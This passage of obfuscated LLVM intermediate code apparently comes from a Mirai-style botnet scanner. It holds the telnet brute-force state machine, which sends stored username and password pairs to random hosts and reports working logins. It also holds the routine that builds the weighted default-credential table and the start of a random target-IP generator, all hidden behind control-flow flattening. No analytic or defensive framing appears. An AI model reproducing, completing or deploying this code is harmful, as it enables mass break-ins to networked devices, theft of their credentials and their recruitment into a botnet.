  store i32 %746, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload24 = load volatile i32, i32* %.reg2mem18
  %Pivot2 = icmp slt i32 %.reload24, 5
  %747 = select i1 %Pivot2, i32 -1277332022, i32 -1209050416
  store i32 %747, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload26 = load volatile i32, i32* %.reg2mem18
  %Pivot = icmp slt i32 %.reload26, 3
  %748 = select i1 %Pivot, i32 1586880819, i32 -1244045966
  store i32 %748, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload25 = load volatile i32, i32* %.reg2mem18
  %SwitchLeaf = icmp eq i32 %.reload25, 2
  %749 = select i1 %SwitchLeaf, i32 -463643981, i32 1433588522
  store i32 %749, i32* %switchVar
  br label %loopEnd

; <label>:750:                                    ; preds = %loopEntry
  %751 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %752 = call i32 @consume_iacs(%struct.scanner_connection* %751)
  store i32 %752, i32* %33, align 4
  %753 = icmp sgt i32 %752, 0
  %754 = select i1 %753, i32 759669254, i32 -1152547507
  store i32 %754, i32* %switchVar
  br label %loopEnd

; <label>:755:                                    ; preds = %loopEntry
  %756 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %757 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %756, i32 0, i32 3
  store i32 3, i32* %757, align 8
  store i32 -1152547507, i32* %switchVar
  br label %loopEnd

; <label>:758:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:759:                                    ; preds = %loopEntry
  %760 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %761 = call i32 @consume_user_prompt(%struct.scanner_connection* %760)
  store i32 %761, i32* %33, align 4
  %762 = icmp sgt i32 %761, 0
  %763 = select i1 %762, i32 -2145895353, i32 307566975
  store i32 %763, i32* %switchVar
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  %765 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %766 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %765, i32 0, i32 1
  %767 = load i32, i32* %766, align 8
  %768 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %769 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %768, i32 0, i32 0
  %770 = load %struct.scanner_auth*, %struct.scanner_auth** %769, align 8
  %771 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %770, i32 0, i32 0
  %772 = load i8*, i8** %771, align 8
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %773, i32 0, i32 0
  %775 = load %struct.scanner_auth*, %struct.scanner_auth** %774, align 8
  %776 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %775, i32 0, i32 4
  %777 = load i8, i8* %776, align 4
  %778 = zext i8 %777 to i64
  %779 = call i64 @send(i32 %767, i8* %772, i64 %778, i32 16384)
  %780 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %781 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %780, i32 0, i32 1
  %782 = load i32, i32* %781, align 8
  %783 = call i64 @send(i32 %782, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  %784 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %785 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %784, i32 0, i32 3
  store i32 4, i32* %785, align 8
  store i32 307566975, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:787:                                    ; preds = %loopEntry
  %788 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %789 = call i32 @consume_pass_prompt(%struct.scanner_connection* %788)
  store i32 %789, i32* %33, align 4
  %790 = icmp sgt i32 %789, 0
  %791 = select i1 %790, i32 1163803758, i32 788986177
  store i32 %791, i32* %switchVar
  br label %loopEnd

; <label>:792:                                    ; preds = %loopEntry
  %793 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %794 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %793, i32 0, i32 1
  %795 = load i32, i32* %794, align 8
  %796 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %797 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %796, i32 0, i32 0
  %798 = load %struct.scanner_auth*, %struct.scanner_auth** %797, align 8
  %799 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %798, i32 0, i32 1
  %800 = load i8*, i8** %799, align 8
  %801 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %802 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %801, i32 0, i32 0
  %803 = load %struct.scanner_auth*, %struct.scanner_auth** %802, align 8
  %804 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %803, i32 0, i32 5
  %805 = load i8, i8* %804, align 1
  %806 = zext i8 %805 to i64
  %807 = call i64 @send(i32 %795, i8* %800, i64 %806, i32 16384)
  %808 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %809 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %808, i32 0, i32 1
  %810 = load i32, i32* %809, align 8
  %811 = call i64 @send(i32 %810, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  %812 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %813 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %812, i32 0, i32 3
  store i32 5, i32* %813, align 8
  store i32 788986177, i32* %switchVar
  br label %loopEnd

; <label>:814:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:815:                                    ; preds = %loopEntry
  %816 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %817 = call i32 @consume_any_prompt(%struct.scanner_connection* %816)
  store i32 %817, i32* %33, align 4
  %818 = icmp sgt i32 %817, 0
  %819 = select i1 %818, i32 224014715, i32 1284375497
  store i32 %819, i32* %switchVar
  br label %loopEnd

; <label>:820:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 5)
  %821 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %821, i8** %34, align 8
  %822 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %823 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %822, i32 0, i32 1
  %824 = load i32, i32* %823, align 8
  %825 = load i8*, i8** %34, align 8
  %826 = load i32, i32* %35, align 4
  %827 = sext i32 %826 to i64
  %828 = call i64 @send(i32 %824, i8* %825, i64 %827, i32 16384)
  %829 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %830 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %829, i32 0, i32 1
  %831 = load i32, i32* %830, align 8
  %832 = call i64 @send(i32 %831, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %833 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %834 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %833, i32 0, i32 3
  store i32 6, i32* %834, align 8
  store i32 1284375497, i32* %switchVar
  br label %loopEnd

; <label>:835:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:836:                                    ; preds = %loopEntry
  %837 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %838 = call i32 @consume_any_prompt(%struct.scanner_connection* %837)
  store i32 %838, i32* %33, align 4
  %839 = icmp sgt i32 %838, 0
  %840 = select i1 %839, i32 -378453366, i32 1292571299
  store i32 %840, i32* %switchVar
  br label %loopEnd

; <label>:841:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 6)
  %842 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %842, i8** %36, align 8
  %843 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %844 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %843, i32 0, i32 1
  %845 = load i32, i32* %844, align 8
  %846 = load i8*, i8** %36, align 8
  %847 = load i32, i32* %37, align 4
  %848 = sext i32 %847 to i64
  %849 = call i64 @send(i32 %845, i8* %846, i64 %848, i32 16384)
  %850 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %851 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %850, i32 0, i32 1
  %852 = load i32, i32* %851, align 8
  %853 = call i64 @send(i32 %852, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %854 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %855 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %854, i32 0, i32 3
  store i32 7, i32* %855, align 8
  store i32 1292571299, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:857:                                    ; preds = %loopEntry
  %858 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %859 = call i32 @consume_any_prompt(%struct.scanner_connection* %858)
  store i32 %859, i32* %33, align 4
  %860 = icmp sgt i32 %859, 0
  %861 = select i1 %860, i32 1659424849, i32 -809931589
  store i32 %861, i32* %switchVar
  br label %loopEnd

; <label>:862:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 4)
  %863 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %863, i8** %38, align 8
  %864 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %865 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %864, i32 0, i32 1
  %866 = load i32, i32* %865, align 8
  %867 = load i8*, i8** %38, align 8
  %868 = load i32, i32* %39, align 4
  %869 = sext i32 %868 to i64
  %870 = call i64 @send(i32 %866, i8* %867, i64 %869, i32 16384)
  %871 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %872 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %871, i32 0, i32 1
  %873 = load i32, i32* %872, align 8
  %874 = call i64 @send(i32 %873, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %875 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %876 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %875, i32 0, i32 3
  store i32 8, i32* %876, align 8
  store i32 -809931589, i32* %switchVar
  br label %loopEnd

; <label>:877:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:878:                                    ; preds = %loopEntry
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = call i32 @consume_any_prompt(%struct.scanner_connection* %879)
  store i32 %880, i32* %33, align 4
  %881 = icmp sgt i32 %880, 0
  %882 = select i1 %881, i32 1627025298, i32 -1005525717
  store i32 %882, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 7)
  %884 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %884, i8** %40, align 8
  %885 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %886 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %885, i32 0, i32 1
  %887 = load i32, i32* %886, align 8
  %888 = load i8*, i8** %40, align 8
  %889 = load i32, i32* %41, align 4
  %890 = sext i32 %889 to i64
  %891 = call i64 @send(i32 %887, i8* %888, i64 %890, i32 16384)
  %892 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %893 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %892, i32 0, i32 1
  %894 = load i32, i32* %893, align 8
  %895 = call i64 @send(i32 %894, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %896 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %897 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %896, i32 0, i32 3
  store i32 9, i32* %897, align 8
  store i32 -1005525717, i32* %switchVar
  br label %loopEnd

; <label>:898:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  %900 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %901 = call i32 @consume_any_prompt(%struct.scanner_connection* %900)
  store i32 %901, i32* %33, align 4
  %902 = icmp sgt i32 %901, 0
  %903 = select i1 %902, i32 2101896449, i32 777676001
  store i32 %903, i32* %switchVar
  br label %loopEnd

; <label>:904:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 8)
  %905 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %905, i8** %42, align 8
  %906 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %907 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %906, i32 0, i32 1
  %908 = load i32, i32* %907, align 8
  %909 = load i8*, i8** %42, align 8
  %910 = load i32, i32* %43, align 4
  %911 = sext i32 %910 to i64
  %912 = call i64 @send(i32 %908, i8* %909, i64 %911, i32 16384)
  %913 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %914 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %913, i32 0, i32 1
  %915 = load i32, i32* %914, align 8
  %916 = call i64 @send(i32 %915, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %917 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %918 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %917, i32 0, i32 3
  store i32 10, i32* %918, align 8
  store i32 777676001, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:920:                                    ; preds = %loopEntry
  %921 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %922 = call i32 @consume_resp_prompt(%struct.scanner_connection* %921)
  store i32 %922, i32* %33, align 4
  %923 = load i32, i32* %33, align 4
  %924 = icmp eq i32 %923, -1
  %925 = select i1 %924, i32 271966146, i32 939827300
  store i32 %925, i32* %switchVar
  br label %loopEnd

; <label>:926:                                    ; preds = %loopEntry
  %927 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %928 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %927, i32 0, i32 1
  %929 = load i32, i32* %928, align 8
  %930 = call i32 @close(i32 %929)
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %932 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %931, i32 0, i32 1
  store i32 -1, i32* %932, align 8
  %933 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %934 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %933, i32 0, i32 8
  %935 = load i8, i8* %934, align 8
  %936 = add i8 %935, 1
  store i8 %936, i8* %934, align 8
  %937 = zext i8 %936 to i32
  %938 = icmp eq i32 %937, 10
  %939 = select i1 %938, i32 2067384031, i32 -2124801474
  store i32 %939, i32* %switchVar
  br label %loopEnd

; <label>:940:                                    ; preds = %loopEntry
  %941 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %942 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %941, i32 0, i32 8
  store i8 0, i8* %942, align 8
  %943 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %944 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %943, i32 0, i32 3
  store i32 0, i32* %944, align 8
  store i32 -1121717688, i32* %switchVar
  br label %loopEnd

; <label>:945:                                    ; preds = %loopEntry
  %946 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %946)
  store i32 -1121717688, i32* %switchVar
  br label %loopEnd

; <label>:947:                                    ; preds = %loopEntry
  store i32 293283106, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  %949 = load i32, i32* %33, align 4
  %950 = icmp sgt i32 %949, 0
  %951 = select i1 %950, i32 1565630555, i32 -1386447780
  store i32 %951, i32* %switchVar
  br label %loopEnd

; <label>:952:                                    ; preds = %loopEntry
  %953 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %954 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %953, i32 0, i32 4
  %955 = load i32, i32* %954, align 4
  %956 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %957 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %956, i32 0, i32 5
  %958 = load i16, i16* %957, align 8
  %959 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %960 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %959, i32 0, i32 0
  %961 = load %struct.scanner_auth*, %struct.scanner_auth** %960, align 8
  call void @report_working(i32 %955, i16 zeroext %958, %struct.scanner_auth* %961)
  %962 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %963 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %962, i32 0, i32 1
  %964 = load i32, i32* %963, align 8
  %965 = call i32 @close(i32 %964)
  %966 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %967 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %966, i32 0, i32 1
  store i32 -1, i32* %967, align 8
  %968 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %969 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %968, i32 0, i32 3
  store i32 0, i32* %969, align 8
  store i32 -1386447780, i32* %switchVar
  br label %loopEnd

; <label>:970:                                    ; preds = %loopEntry
  store i32 293283106, i32* %switchVar
  br label %loopEnd

; <label>:971:                                    ; preds = %loopEntry
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -2023834523, i32* %switchVar
  br label %loopEnd

; <label>:972:                                    ; preds = %loopEntry
  store i32 0, i32* %33, align 4
  store i32 1967058570, i32* %switchVar
  br label %loopEnd

; <label>:973:                                    ; preds = %loopEntry
  %974 = load i32, i32* %33, align 4
  %975 = icmp eq i32 %974, 0
  %976 = select i1 %975, i32 1472997354, i32 -679226714
  store i32 %976, i32* %switchVar
  br label %loopEnd

; <label>:977:                                    ; preds = %loopEntry
  store i32 1599551390, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  %979 = load i32, i32* %33, align 4
  %980 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %981 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %980, i32 0, i32 6
  %982 = load i32, i32* %981, align 4
  %983 = icmp sgt i32 %979, %982
  %984 = select i1 %983, i32 -1002817245, i32 -761581346
  store i32 %984, i32* %switchVar
  br label %loopEnd

; <label>:985:                                    ; preds = %loopEntry
  %986 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %987 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %986, i32 0, i32 6
  %988 = load i32, i32* %987, align 4
  store i32 %988, i32* %33, align 4
  store i32 -761581346, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = load i32, i32* %33, align 4
  %991 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %992 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %991, i32 0, i32 6
  %993 = load i32, i32* %992, align 4
  %994 = sub nsw i32 %993, %990
  store i32 %994, i32* %992, align 4
  %995 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %996 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %995, i32 0, i32 7
  %997 = getelementptr inbounds [256 x i8], [256 x i8]* %996, i32 0, i32 0
  %998 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %999 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %998, i32 0, i32 7
  %1000 = getelementptr inbounds [256 x i8], [256 x i8]* %999, i32 0, i32 0
  %1001 = load i32, i32* %33, align 4
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds i8, i8* %1000, i64 %1002
  %1004 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1005 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1004, i32 0, i32 6
  %1006 = load i32, i32* %1005, align 4
  %1007 = sext i32 %1006 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %997, i8* %1003, i64 %1007, i32 1, i1 false)
  store i32 -598231047, i32* %switchVar
  br label %loopEnd

; <label>:1008:                                   ; preds = %loopEntry
  store i32 1533872320, i32* %switchVar
  br label %loopEnd

; <label>:1009:                                   ; preds = %loopEntry
  store i32 -1013021947, i32* %switchVar
  br label %loopEnd

; <label>:1010:                                   ; preds = %loopEntry
  store i32 -1607328824, i32* %switchVar
  br label %loopEnd

; <label>:1011:                                   ; preds = %loopEntry
  store i32 -538795431, i32* %switchVar
  br label %loopEnd

; <label>:1012:                                   ; preds = %loopEntry
  %1013 = load i32, i32* %1, align 4
  %1014 = add nsw i32 %1013, 1
  store i32 %1014, i32* %1, align 4
  store i32 1026702061, i32* %switchVar
  br label %loopEnd

; <label>:1015:                                   ; preds = %loopEntry
  store i32 1790762428, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %1015, %1012, %1011, %1010, %1009, %1008, %989, %985, %978, %977, %973, %972, %NewDefault, %971, %970, %952, %948, %947, %945, %940, %926, %920, %919, %904, %899, %898, %883, %878, %877, %862, %857, %856, %841, %836, %835, %820, %815, %814, %792, %787, %786, %764, %759, %758, %755, %750, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %736, %727, %726, %725, %723, %718, %704, %699, %694, %690, %688, %667, %655, %649, %648, %642, %641, %623, %622, %611, %603, %599, %590, %572, %571, %561, %557, %552, %550, %548, %541, %538, %537, %536, %535, %531, %509, %503, %502, %498, %476, %470, %469, %464, %463, %461, %456, %448, %436, %427, %412, %408, %407, %398, %397, %388, %387, %375, %374, %370, %367, %366, %360, %351, %347, %345, %344, %332, %331, %323, %322, %314, %313, %305, %304, %296, %295, %286, %285, %276, %275, %268, %267, %260, %259, %254, %253, %248, %243, %226, %225, %224, %221, %166, %162, %160, %155, %109, %103, %99, %98, %95, %84, %83, %79, %76, %65, %61, %55, %50, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* %9, i64 %13) #6
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %switchVar = alloca i32
  store i32 915728304, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 915728304, label %6
    i32 1989390093, label %23
    i32 -125811873, label %28
    i32 554311231, label %33
    i32 2141195428, label %38
    i32 1168710303, label %43
    i32 770950567, label %48
    i32 687679617, label %53
    i32 134987165, label %58
    i32 -241189096, label %63
    i32 248730737, label %68
    i32 -688825959, label %73
    i32 417878016, label %78
    i32 -829175959, label %83
    i32 2135692023, label %88
    i32 -854615820, label %93
    i32 1218045218, label %98
    i32 524798225, label %103
    i32 618871075, label %108
    i32 392099142, label %113
    i32 253574911, label %118
    i32 -1863455081, label %123
    i32 1100351015, label %128
    i32 -883919577, label %133
    i32 -2037411729, label %138
    i32 -2144041976, label %143
    i32 2131185914, label %148
    i32 -932039609, label %153
    i32 -737134909, label %158
    i32 -1665167464, label %163
    i32 -20951661, label %168
    i32 -1918865593, label %173
    i32 -773109248, label %178
    i32 -1384755274, label %183
    i32 768371288, label %188
    i32 936472970, label %193
    i32 2066917799, label %198
    i32 740981050, label %203
    i32 -1357290300, label %208
    i32 -136274487, label %213
    i32 2067462910, label %218
    i32 -620694938, label %223
    i32 -895947735, label %228
    i32 1311628141, label %233
    i32 -410523864, label %238
    i32 -1355281080, label %243
    i32 -15707370, label %248
    i32 -1612477371, label %253
    i32 -865296584, label %258
    i32 854766564, label %263
    i32 1768725582, label %268
    i32 2112046597, label %273
    i32 474781686, label %278
    i32 563433819, label %283
    i32 235745372, label %288
    i32 -1884301627, label %293
    i32 872571810, label %298
    i32 -810824413, label %303
    i32 -1353576383, label %308
    i32 855384314, label %313
    i32 1887521771, label %318
    i32 865078093, label %323
    i32 -813268719, label %328
    i32 2113305181, label %333
    i32 -87623977, label %338
    i32 -1004535020, label %343
    i32 -1404658951, label %348
    i32 -932539351, label %353
